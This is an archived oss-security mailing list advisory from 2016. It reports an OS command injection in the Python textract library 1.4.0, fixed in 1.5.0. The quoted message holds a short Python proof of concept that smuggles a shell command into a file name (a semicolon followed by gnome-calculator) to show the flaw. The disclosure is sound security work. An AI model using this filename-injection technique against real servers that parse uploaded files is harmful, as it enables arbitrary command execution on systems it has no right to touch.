X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/17/2
Message-ID: <CAO8=cJ9qRB4_4TMcES57a4+J-Fwf-ZzDNaLvq93JC7yNndBD2g@mail.gmail.com>
Date: Thu, 17 Nov 2016 09:18:26 -0500
From: Pierre Ernst <pernst@...esforce.com>
To: oss-security@...ts.openwall.com
Subject: Re: CVE request - textract 1.4.0 - OS Command Injection
Content-Type: text/plain; charset=utf-8

Version 1.5.0 includes a fix for this

https://github.com/deanmalmgren/textract/releases/tag/v1.5.0


On Thu, Oct 20, 2016 at 5:40 PM, Pierre Ernst <pernst@...esforce.com> wrote:

> The Python textract component (https://github.com/
> deanmalmgren/textract/tree/v1.4.0) is vulnerable to OS command injection.
>
> this fork contains a fix:
> https://github.com/pierre-ernst/textract
>
>
> Parsing a file with a malicious name leads to arbitrary OS command
> injection, this is especially risky when parsing user-supplied files on a
> server (e.g. uploaded files)
>
> PoC:
>
> import textract
> import sys
> import os
>
> # create a file with a malicious name and arbitrary content
> fileName = './test";gnome-calculator;#.pdf'
> file = open(fileName,'w+')
> file.write('Pierre Ernst, Salesforce')
> file.close()
>
> # parse newly created file
> text = textract.process(fileName)
> print text
>
> # cleanup
> os.remove(fileName);
>
>
> --
> Pierre Ernst
> Salesforce
>
>


-- 
Pierre Ernst
Senior Application Security Engineer
M&A Security
Salesforce.com
mobile: +1 613-404-1450
timezone: EDT

